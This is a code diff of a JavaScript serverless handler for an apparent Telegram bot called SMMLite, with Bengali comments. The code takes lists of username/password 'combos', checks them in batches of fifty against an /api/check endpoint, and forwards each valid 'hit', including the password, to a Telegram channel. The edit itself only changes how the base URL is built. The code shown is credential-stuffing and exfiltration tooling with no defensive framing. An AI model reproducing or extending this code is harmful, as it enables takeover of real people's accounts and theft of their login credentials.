@@ -1,8 +1,7 @@
-// api/telegram.js – SMMLite with batch processing (fast)
-import { checkAccount } from '../lib/checkCore.js';
+// api/telegram.js – SMMLite with batch processing (using relative URL)
 import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } from '../lib/config.js';
 
-const BATCH_SIZE = 50; // একবারে কয়টি কম্বো প্রসেস করবে
+const BATCH_SIZE = 50;
 
 export default async function handler(req, res) {
   if (req.method !== 'POST') {
@@ -64,7 +63,7 @@ export default async function handler(req, res) {
       const batchNum = Math.floor(i / BATCH_SIZE) + 1;
       const totalBatches = Math.ceil(combos.length / BATCH_SIZE);
 
-      // ব্যাচ চেক করার জন্য API কল
+      // ব্যাচ চেক – আপেক্ষিক URL ব্যবহার
       const result = await checkBatch(batch);
       
       // রেজাল্ট প্রসেস
@@ -73,7 +72,6 @@ export default async function handler(req, res) {
         if (res.valid && res.hit) {
           totalHits++;
           allHits.push(res);
-          // HIT ফরওয়ার্ড
           await forwardToChannel(res.username, res.password, res);
         }
       }
@@ -99,10 +97,15 @@ export default async function handler(req, res) {
   return res.status(200).json({ ok: true });
 }
 
-// ---------- ব্যাচ চেক ফাংশন ----------
+// ---------- ব্যাচ চেক ফাংশন (আপেক্ষিক URL) ----------
 async function checkBatch(batch) {
   try {
-    const response = await fetch(`${process.env.VERCEL_URL || 'https://smmlitetgversion.vercel.app'}/api/check`, {
+    // Vercel-এ আপেক্ষিক পাথ কাজ করে
+    const baseUrl = process.env.VERCEL_URL 
+      ? `https://${process.env.VERCEL_URL}` 
+      : 'https://smmlitetgversion.vercel.app';
+    
+    const response = await fetch(`${baseUrl}/api/check`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ combos: batch })
